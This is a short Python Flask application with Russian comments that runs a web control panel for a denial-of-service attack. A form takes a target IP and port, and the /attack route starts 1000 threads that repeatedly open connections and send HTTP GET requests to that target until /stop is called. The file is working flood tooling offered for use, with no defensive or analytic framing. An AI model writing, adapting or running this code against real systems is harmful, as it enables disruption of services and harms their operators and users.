from flask import Flask, render_template, request
import socket
import threading
import time
from flask_socketio import SocketIO

app = Flask(__name__)
app.config['SECRET_KEY'] = '0x7F1A2E'
socketio = SocketIO(app)

# Глобальные переменные
attack_active = False
threads = []

def ddos_attack(target_ip, port=80):
    global attack_active
    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
            s.close()
        except:
            pass
        time.sleep(0.01)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/attack', methods=['POST'])
def start_attack():
    global attack_active, threads
    target_ip = request.form['ip']
    port = int(request.form.get('port', 80))
    
    attack_active = True
    for _ in range(1000):  # 1000 потоков
        thread = threading.Thread(target=ddos_attack, args=(target_ip, port))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    return f"ATTACK STARTED ON {target_ip}:{port}"

@app.route('/stop')
def stop_attack():
    global attack_active
    attack_active = False
    return "ATTACK STOPPED"

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)